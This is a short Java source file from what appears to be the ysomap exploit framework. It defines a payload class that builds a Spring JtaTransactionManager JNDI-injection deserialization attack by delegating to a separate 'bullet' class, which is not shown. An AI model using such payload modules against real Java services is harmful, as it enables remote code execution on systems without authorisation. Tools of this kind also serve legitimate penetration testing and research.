package ysomap.payloads.java.spring;

import ysomap.bullets.Bullet;
import ysomap.bullets.spring.SpringJndiBullet2;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {"SpringJndiBullet2"}, param = false)
@Dependencies({"org.springframework:spring-tx","javax.transaction:jta"})
@Authors({ Authors.WH1T3P1G })
public class SpringJndiWithJtaTransactionManager extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SpringJndiBullet2.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        return obj;
    }
}
